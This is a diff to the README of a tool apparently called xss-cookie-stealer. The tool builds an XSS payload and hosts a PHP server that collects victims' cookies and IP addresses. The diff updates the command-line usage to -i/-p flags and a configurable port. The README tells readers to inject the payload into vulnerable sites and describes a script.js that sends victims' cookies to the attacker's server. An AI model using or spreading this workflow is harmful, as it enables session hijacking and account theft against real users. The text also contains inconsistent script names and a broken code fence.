@@ -23,21 +23,20 @@ This Python script automates the process of setting up a simple PHP server to ca
 You can display the help message by running:
 
 ```bash
-python3 xss-cookie-stealer.py -h
+python3 xss-cookie-stealer.py -ch
 ```
 
 ### Run the Script
-To generate the payload and set up the PHP server, provide your IP address as an argument:
+To generate the payload and set up the PHP server, provide your IP address and port as arguments:
 
 ```bash
-python3 xss-cookie-stealer.py <YOUR_IP>
+python3 xss-cookie-stealer.py -i <YOUR_IP> -p 80
 ```
 
 Example:
 
 ```bash
-python3 xss-cookie-stealer.py 192.168.1.10
-```
+python3 xss-cookie-stealer.py -i 192.168.1.10 -p 80```
 
 ### Payload
 After running the script, the XSS payload will be echoed to the terminal. You can inject this payload into a vulnerable web page to capture cookies:
@@ -52,10 +51,10 @@ The script will create the following files in the `web-server` directory:
 - **`script.js`**: Sends the victim's cookies to the PHP script.
 
 ### Start PHP Server
-The script will start a PHP server on port 80 to host the web server:
+The script will start a PHP server on the port you choose to host the web server:
 
 ```bash
-sudo php -S 0.0.0.0:80 -t web-server
+sudo php -S 0.0.0.0:port -t web-server
 ```
 
 ### Log Output
@@ -63,9 +62,9 @@ Captured cookies and victim IP addresses will be saved in the `cookies.txt` file
 
 ## Example Workflow
 
-1. Run the script with your IP address:
+1. Run the script with your IP address & port:
    ```bash
-   python3 create_payload.py 192.168.1.10
+   python3 create_payload.py -i 192.168.1.10 -p 80
    ```
 
 2. Inject the payload in a vulnerable website:
